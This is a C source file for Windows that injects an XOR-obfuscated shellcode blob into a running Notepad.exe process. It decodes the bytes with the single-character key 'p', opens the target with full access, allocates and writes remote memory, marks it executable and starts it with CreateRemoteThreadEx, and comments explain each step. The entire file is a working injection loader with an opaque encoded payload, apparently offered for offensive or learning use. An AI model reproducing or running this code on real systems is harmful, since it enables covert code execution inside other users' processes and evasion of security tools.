#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h>

unsigned char code[] =
"\x8c\x38\xf3\x94\x80\x98\xbc\x70\x70\x70\x31\x21\x31\x20\x22\x38"
"\x41\xa2\x21\x15\x38\xfb\x22\x10\x26\x38\xfb\x22\x68\x38\xfb\x22"
"\x50\x3d\x41\xb9\x38\x7f\xc7\x3a\x3a\x38\xfb\x02\x20\x38\x41\xb0"
"\xdc\x4c\x11\x0c\x72\x5c\x50\x31\xb1\xb9\x7d\x31\x71\xb1\x92\x9d"
"\x22\x31\x21\x38\xfb\x22\x50\xfb\x32\x4c\x38\x71\xa0\x16\xf1\x08"
"\x68\x7b\x72\x7f\xf5\x02\x70\x70\x70\xfb\xf0\xf8\x70\x70\x70\x38"
"\xf5\xb0\x04\x17\x38\x71\xa0\x34\xfb\x30\x50\xfb\x38\x68\x39\x71"
"\xa0\x20\x93\x26\x3d\x41\xb9\x38\x8f\xb9\x31\xfb\x44\xf8\x38\x71"
"\xa6\x38\x41\xb0\xdc\x31\xb1\xb9\x7d\x31\x71\xb1\x48\x90\x05\x81"
"\x3c\x73\x3c\x54\x78\x35\x49\xa1\x05\xa8\x28\x34\xfb\x30\x54\x39"
"\x71\xa0\x16\x31\xfb\x7c\x38\x34\xfb\x30\x6c\x39\x71\xa0\x31\xfb"
"\x74\xf8\x31\x28\x38\x71\xa0\x31\x28\x2e\x29\x2a\x31\x28\x31\x29"
"\x31\x2a\x38\xf3\x9c\x50\x31\x22\x8f\x90\x28\x31\x29\x2a\x38\xfb"
"\x62\x99\x3b\x8f\x8f\x8f\x2d\x39\xce\x07\x03\x42\x2f\x43\x42\x70"
"\x70\x31\x26\x39\xf9\x96\x38\xf1\x9c\xd0\x71\x70\x70\x39\xf9\x95"
"\x39\xcc\x72\x70\x71\xcb\xb0\xd8\x71\x6e\x31\x24\x39\xf9\x94\x3c"
"\xf9\x81\x31\xca\x3c\x07\x56\x77\x8f\xa5\x3c\xf9\x9a\x18\x71\x71"
"\x70\x70\x29\x31\xca\x59\xf0\x1b\x70\x8f\xa5\x1a\x7a\x31\x2e\x20"
"\x20\x3d\x41\xb9\x3d\x41\xb0\x38\x8f\xb0\x38\xf9\xb2\x38\x8f\xb0"
"\x38\xf9\xb1\x31\xca\x9a\x7f\xaf\x90\x8f\xa5\x38\xf9\xb7\x1a\x60"
"\x31\x28\x3c\xf9\x92\x38\xf9\x89\x31\xca\xe9\xd5\x04\x11\x8f\xa5"
"\xf5\xb0\x04\x7a\x39\x8f\xbe\x05\x95\x98\xe3\x70\x70\x70\x38\xf3"
"\x9c\x60\x38\xf9\x92\x3d\x41\xb9\x1a\x74\x31\x28\x38\xf9\x89\x31"
"\xca\x72\xa9\xb8\x2f\x8f\xa5\xf3\x88\x70\x0e\x25\x38\xf3\xb4\x50"
"\x2e\xf9\x86\x1a\x30\x31\x29\x18\x70\x60\x70\x70\x31\x28\x38\xf9"
"\x82\x38\x41\xb9\x31\xca\x28\xd4\x23\x95\x8f\xa5\x38\xf9\xb3\x39"
"\xf9\xb7\x3d\x41\xb9\x39\xf9\x80\x38\xf9\xaa\x38\xf9\x89\x31\xca"
"\x72\xa9\xb8\x2f\x8f\xa5\xf3\x88\x70\x0d\x58\x28\x31\x27\x29\x18"
"\x70\x30\x70\x70\x31\x28\x1a\x70\x2a\x31\xca\x7b\x5f\x7f\x40\x8f"
"\xa5\x27\x29\x31\xca\x05\x1e\x3d\x11\x8f\xa5\x39\x8f\xbe\x99\x4c"
"\x8f\x8f\x8f\x38\x71\xb3\x38\x59\xb6\x38\xf5\x86\x05\xc4\x31\x8f"
"\x97\x28\x1a\x70\x29\x39\xb7\xb2\x80\xc5\xd2\x26\x8f\xa5\x70";





DWORD findProcess(const char* pName) {
    HANDLE hProcSnap; // Holds Current Process Handle
    PROCESSENTRY32 pe32; // Holds Information About Current Process
    DWORD pID = 0; // Will Get Filled the Notepads process ID if it finds it

    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); // Create a SnapShot Of All Running Processes

    if (hProcSnap == INVALID_HANDLE_VALUE) { // Check If Taking the Snapshot Failed
        printf("[-] Failed To Create Proc Snapshot\n");
        return 0;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32); // Get the Size of all Running Processes, Needed For Process32Next

    if (!Process32First(hProcSnap, &pe32)) { // Check If We Can Get Information About First Process, If we cant we exit
        printf("[-] Failed To Gather Process Info\n");
        CloseHandle(hProcSnap);
        return 0;
    }

    do { // While Current Process In List != Notepad.exe loop to the next and check
        if (strcmp(pe32.szExeFile, pName) == 0) { // Check If Its the Process we want
            pID = pe32.th32ProcessID; // If So Store the Process ID into pID
            break; // Then Break
        }
    }while (Process32Next(hProcSnap, &pe32)); // Go Through Each Process

    CloseHandle(hProcSnap); // Close Handle
    return pID; // Return The pID
}



int main(int argc, char  *argv[])
{
    HANDLE hProcess = NULL, hThread = NULL; // Holds Process And Thread Handle
    DWORD pID = 0, tID = 0; // Holds Process and Thread ID
    PVOID rBuffer = NULL; // Holds Pointer to Where Our Buffer in memory starts
    size_t code_len = sizeof(code); // Get Amount Of Bytes Of Shellcode
    int i = 0;
    char key = 'p'; // Key For Decrypting ShellCode

    for (i; i< code_len; i++) {
        code[i] = code[i] ^ key; // Decrypt shellcode Byte-by-Byte
    }

    printf("[+] Attempting To Find Notepad in Process List...\n");
    const char* pName = "Notepad.exe";
    pID = findProcess(pName); // Check All Process's For Notepad

    if (pID == 0) { // Check If we Found it Or Not
        printf("[!] Failed To Find Notepad It May Not be Running\n[!] Error Code: 0x%ld", GetLastError());
        return EXIT_FAILURE;
    }
    printf("[*] Found Notepad: %ld\n", pID);
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pID); // Get a Handle To Notepad With all Access

    if (hProcess == NULL) {
        printf("[!] Failed Getting Handle\n[!] Error Code: 0x%ld", GetLastError());
        return EXIT_FAILURE;
    }

    printf("[*] Got Handle: 0x%p\n", hProcess);

    rBuffer = VirtualAllocEx(hProcess, NULL, code_len, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE); // Allocate a Buffer in the Process's Memory for our shellcode

    if (rBuffer == NULL) {
        printf("[!] Failed Allocating Buffer\n[!]Error Code: 0x%ld", GetLastError());
    }
    printf("[*] Succesfully Allocated a Buffer Of %d-Bytes, With RW Perms!\n", code_len);

    WriteProcessMemory(hProcess, rBuffer, code, code_len, NULL); // Write the Shellcode into Memory
    printf("[*] Wrote Code Into Memory\n");

    DWORD oldPerms;
    if (!VirtualProtectEx(hProcess, rBuffer, code_len, PAGE_EXECUTE_READ, &oldPerms)) {
        printf("[!] Failed To Set New Perms\n[!] Error Code: 0x%ld", GetLastError());
        return EXIT_FAILURE;
    }

    hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &tID); // Create a Thread Too Run Our ShellCode

    if (hThread == NULL) {
        printf("[!] Failed Starting Thread\n[!] Error Code: 0x%ld", GetLastError());
        return EXIT_FAILURE;
    }
    printf("[+] Starting Thread...\n");

    WaitForSingleObject(hThread, INFINITE); // Wait For Thread To Finish
    printf("[+] Thread Finished, Cleaning Up...\n");
    CloseHandle(hThread); 
                          // Close Handles
    CloseHandle(hProcess);

    return EXIT_SUCCESS;
}


